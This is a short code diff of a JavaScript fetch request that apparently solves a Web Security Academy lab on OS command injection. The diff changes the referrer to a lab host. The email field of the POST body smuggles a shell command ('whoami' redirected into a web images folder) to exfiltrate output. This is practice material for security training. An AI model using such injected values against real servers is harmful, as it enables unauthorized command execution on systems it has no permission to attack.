@@ -85,7 +85,7 @@ async function submitFeedbackAndLogImage() {
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-origin"
       },
-      "referrer": "https://example.com/feedback",
+      "referrer": "https://0ad600d803c7dfea80968fbc002400ec.web-security-academy.net/feedback",
       "body": "csrf=VNXRe5IObKOWXLvqUaX27zA7B0RhRj0Z&name=Huzefa&email=huzefa%40gmail.com; whoami > /var/www/images/out.txt;&subject=Huzefa&message=Huzefa",
       "method": "POST",
       "mode": "cors",
